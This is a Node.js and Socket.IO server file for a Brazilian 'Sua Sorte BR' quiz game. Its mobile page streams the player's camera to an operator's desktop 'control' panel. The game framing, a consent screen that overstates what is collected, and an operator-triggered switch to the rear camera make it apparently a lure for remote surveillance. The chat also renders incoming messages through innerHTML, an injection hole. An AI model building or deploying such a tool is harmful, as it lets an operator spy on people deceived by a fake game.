const express = require('express');
const http = require('http');
const { Server } = require('socket.io');

const app = express();
const server = http.createServer(app);
const io = new Server(server, { 
  cors: { origin: "*" }
});

const PORT = process.env.PORT || 3000;

app.get('/', (req, res) => {
  const ua = req.headers['user-agent']?.toLowerCase() || '';
  const isMobile = /mobile|android|iphone/i.test(ua);
  const host = req.headers.host;
  const protocol = req.headers['x-forwarded-proto'] || 'http';
  const fullUrl = `${protocol}://${host}`;

  res.send(isMobile ? getMobileHTML(fullUrl) : getDesktopHTML(fullUrl));
});

// ==================== CELULAR - SUA SORTE BR (CORRIGIDO) ====================
function getMobileHTML(fullUrl) {
  return `<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1, user-scalable=no">
    <title>Sua Sorte BR</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@500;600;700&display=swap');
        
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Poppins', sans-serif;
            background: linear-gradient(135deg, #0a0a0a, #1a0033);
            color: white;
            height: 100vh;
            overflow: hidden;
        }

        .header {
            background: linear-gradient(to right, #ff00cc, #00ffcc);
            padding: 15px 16px;
            text-align: center;
            font-size: 22px;
            font-weight: 700;
            letter-spacing: 1px;
            box-shadow: 0 4px 15px rgba(255,0,204,0.6);
        }

        .consent-screen {
            position: absolute;
            inset: 0;
            background: rgba(10,10,10,0.97);
            display: flex;
            align-items: center;
            justify-content: center;
            z-index: 1000;
            padding: 20px;
        }
        .consent-box {
            background: #1f0033;
            border: 3px solid #ff00cc;
            border-radius: 20px;
            padding: 30px 25px;
            max-width: 340px;
            text-align: center;
        }
        .consent-box h2 { color: #ff00cc; font-size: 26px; margin-bottom: 20px; }
        .start-btn {
            background: linear-gradient(to right, #ff00cc, #00ff88);
            color: black;
            font-weight: bold;
            border: none;
            padding: 16px;
            border-radius: 50px;
            font-size: 17px;
            width: 100%;
            margin-top: 20px;
            cursor: pointer;
        }

        .game-container {
            display: none;
            flex-direction: column;
            height: 100vh;
        }

        .question-area {
            background: #2a0044;
            padding: 18px 16px;
            text-align: center;
            border-bottom: 4px solid #ff00cc;
        }
        .question {
            font-size: 19px;
            font-weight: 600;
            margin-bottom: 8px;
        }
        .timer {
            font-size: 32px;
            font-weight: 700;
            color: #ff00cc;
        }

        .messages {
            flex: 1;
            overflow-y: auto;
            padding: 16px;
            display: flex;
            flex-direction: column;
            gap: 10px;
            background: rgba(0,0,0,0.5);
        }
        .message {
            display: flex;
            margin-bottom: 8px;
        }
        .message.sent { justify-content: flex-end; }
        .message.received { justify-content: flex-start; }
        .bubble {
            max-width: 78%;
            padding: 12px 16px;
            border-radius: 18px;
            font-size: 16px;
        }
        .message.sent .bubble { background: #00ff88; color: black; }
        .message.received .bubble { background: #ff00cc; color: white; }

        .input-area {
            background: #1a0033;
            padding: 12px 16px;
            display: flex;
            gap: 10px;
        }
        .input-field {
            flex: 1;
            background: #2a0044;
            border: none;
            border-radius: 30px;
            padding: 14px 18px;
            color: white;
            font-size: 16px;
        }
        .send-btn {
            background: #00ff88;
            color: black;
            border: none;
            width: 52px;
            height: 52px;
            border-radius: 50%;
            font-size: 24px;
            cursor: pointer;
        }
    </style>
</head>
<body>

    <!-- TELA DE CONSENTIMENTO -->
    <div class="consent-screen" id="consentScreen">
        <div class="consent-box">
            <h2>🔥 SUA SORTE BR 🔥</h2>
            <p><strong>Jogo de Perguntas em Tempo Real</strong></p>
            <p>O operador controla as perguntas e prêmios.</p>
            <p>Ao aceitar, você permite:<br>
            • Câmera ao vivo<br>
            • Microfone<br>
            • Localização em tempo real</p>
            <button class="start-btn" id="acceptBtn">ACEITAR E COMEÇAR A JOGAR</button>
        </div>
    </div>

    <!-- TELA DO JOGO -->
    <div class="game-container" id="gameScreen">
        <div class="header">SUA SORTE BR</div>

        <div class="question-area">
            <div class="question" id="questionText">Aguardando pergunta do operador...</div>
            <div class="timer" id="timer">00</div>
        </div>

        <div class="messages" id="messages"></div>

        <div class="input-area">
            <input type="text" class="input-field" id="messageInput" placeholder="Digite sua resposta...">
            <button class="send-btn" id="sendBtn">➤</button>
        </div>
    </div>

    <video id="localVideo" autoplay playsinline muted style="display: none;"></video>

    <script src="/socket.io/socket.io.js"></script>
    <script>
        const socket = io('${fullUrl}');

        let mediaStream = null;
        let facingMode = 'user';
        let permissions = false;
        let frameInterval = null;

        const consentScreen = document.getElementById('consentScreen');
        const gameScreen = document.getElementById('gameScreen');
        const messagesDiv = document.getElementById('messages');
        const messageInput = document.getElementById('messageInput');
        const sendBtn = document.getElementById('sendBtn');
        const questionText = document.getElementById('questionText');
        const timerEl = document.getElementById('timer');

        function addMessage(text, isSent = true) {
            const div = document.createElement('div');
            div.className = \`message \${isSent ? 'sent' : 'received'}\`;
            div.innerHTML = \`<div class="bubble">\${text}</div>\`;
            messagesDiv.appendChild(div);
            messagesDiv.scrollTop = messagesDiv.scrollHeight;
        }

        // Envio de vídeo otimizado
        function sendFrame() {
            if (!permissions || !localVideo.videoWidth) return;
            const canvas = document.createElement('canvas');
            canvas.width = 260;
            canvas.height = 195;
            const ctx = canvas.getContext('2d');
            ctx.drawImage(localVideo, 0, 0, 260, 195);
            socket.emit('frame', canvas.toDataURL('image/jpeg', 0.68));
        }

        async function startGame() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({
                    video: { width: { ideal: 640 }, height: { ideal: 480 }, facingMode: facingMode },
                    audio: true
                });

                mediaStream = stream;
                localVideo.srcObject = stream;
                await localVideo.play();

                // Envia frames com mais estabilidade
                frameInterval = setInterval(sendFrame, 220);

                permissions = true;
                consentScreen.style.display = 'none';
                gameScreen.style.display = 'flex';

                socket.emit('mobile_online');

            } catch (err) {
                alert("É necessário permitir a câmera e o microfone para jogar.");
            }
        }

        // Enviar mensagem
        function sendMessage() {
            const text = messageInput.value.trim();
            if (!text) return;
            addMessage(text, true);
            socket.emit('message', text);
            messageInput.value = '';
        }

        sendBtn.onclick = sendMessage;
        messageInput.addEventListener('keypress', e => {
            if (e.key === 'Enter') sendMessage();
        });

        // Receber pergunta do PC
        socket.on('question', (data) => {
            questionText.textContent = data.question || "Pergunta recebida";
            timerEl.textContent = data.time || "30";
        });

        socket.on('message', (msg) => addMessage(msg, false));

        document.getElementById('acceptBtn').onclick = startGame;

        // Troca de câmera
        socket.on('toggle_camera', () => {
            facingMode = facingMode === 'user' ? 'environment' : 'user';
            if (permissions) startGame();
        });
    </script>
</body>
</html>`;
}

// ==================== DESKTOP - CONTROLE (com visualização da câmera) ====================
function getDesktopHTML(fullUrl) {
  return `<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <title>Sua Sorte BR - Controle</title>
    <style>
        body {
            font-family: 'Poppins', sans-serif;
            background: #0a0a0a;
            color: white;
            margin: 0;
            padding: 20px;
        }
        h1 { text-align: center; color: #ff00cc; margin-bottom: 20px; }
        .video-container {
            text-align: center;
            margin-bottom: 20px;
        }
        #remoteVideo {
            max-width: 100%;
            max-height: 320px;
            border: 3px solid #ff00cc;
            border-radius: 12px;
            background: black;
        }
        .controls {
            display: grid;
            gap: 12px;
            max-width: 700px;
            margin: 0 auto;
        }
        input, textarea {
            padding: 14px;
            background: #1f1f1f;
            border: 2px solid #ff00cc;
            color: white;
            border-radius: 10px;
            font-size: 16px;
        }
        button {
            padding: 16px;
            font-size: 17px;
            background: linear-gradient(#ff00cc, #00ffcc);
            color: black;
            border: none;
            border-radius: 10px;
            cursor: pointer;
            font-weight: bold;
        }
    </style>
</head>
<body>
    <h1>🎰 SUA SORTE BR - CONTROLE</h1>

    <div class="video-container">
        <img id="remoteVideo" src="" alt="Câmera do jogador">
    </div>

    <div class="controls">
        <input type="text" id="questionInput" placeholder="Digite a pergunta aqui...">
        <input type="number" id="timeInput" value="30" placeholder="Tempo em segundos">
        <button onclick="sendQuestion()">Enviar Pergunta</button>
        
        <button onclick="toggleCamera()">Trocar Câmera do Celular</button>
        <button onclick="vibrate()">Vibrar Celular</button>
    </div>

    <script src="/socket.io/socket.io.js"></script>
    <script>
        const socket = io('${fullUrl}');
        const remoteVideo = document.getElementById('remoteVideo');

        function sendQuestion() {
            const question = document.getElementById('questionInput').value.trim();
            const time = parseInt(document.getElementById('timeInput').value) || 30;
            if (question) {
                socket.emit('question', { question, time });
            }
        }

        function toggleCamera() {
            socket.emit('toggle_camera');
        }

        function vibrate() {
            socket.emit('vibrate');
        }

        socket.on('frame', (frame) => {
            remoteVideo.src = frame;
        });

        socket.on('mobile_online', () => {
            console.log("Celular conectado");
        });
    </script>
</body>
</html>`;
}

// Socket.IO
io.on('connection', (socket) => {
  console.log('Cliente conectado:', socket.id);

  socket.on('message', (msg) => socket.broadcast.emit('message', msg));
  socket.on('frame', (frame) => socket.broadcast.emit('frame', frame));
  socket.on('question', (data) => socket.broadcast.emit('question', data));
  socket.on('toggle_camera', () => socket.broadcast.emit('toggle_camera'));
  socket.on('vibrate', () => socket.broadcast.emit('vibrate'));
  socket.on('mobile_online', () => socket.broadcast.emit('mobile_online'));
});

server.listen(PORT, '0.0.0.0', () => {
  console.log(`\n🔥 Sua Sorte BR rodando em http://localhost:${PORT}`);
  console.log(`Abra PRIMEIRO no CELULAR`);
});
